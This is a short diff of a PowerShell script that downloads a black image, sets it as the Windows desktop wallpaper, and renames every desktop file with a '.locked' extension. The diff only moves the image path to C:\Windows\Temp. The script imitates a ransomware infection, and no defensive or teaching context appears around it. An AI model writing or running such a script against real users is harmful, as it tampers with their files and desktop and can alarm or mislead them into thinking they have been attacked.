@@ -2,7 +2,7 @@
 $url = "https://www.solidbackgrounds.com/images/3840x2160/3840x2160-black-solid-color-background.jpg"
 
 
-Invoke-WebRequest $url -OutFile C:\temp\black.jpg
+Invoke-WebRequest $url -OutFile C:\Windows\Temp\black.jpg
 
 
 $setwallpapersrc = @"
@@ -23,7 +23,7 @@ public class Wallpaper
 "@
 Add-Type -TypeDefinition $setwallpapersrc
 
-[Wallpaper]::SetWallpaper("C:\temp\black.jpg")
+[Wallpaper]::SetWallpaper("C:\Windows\Temp\black.jpg")
 
 # Rename Files
 Get-ChildItem $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".locked"}
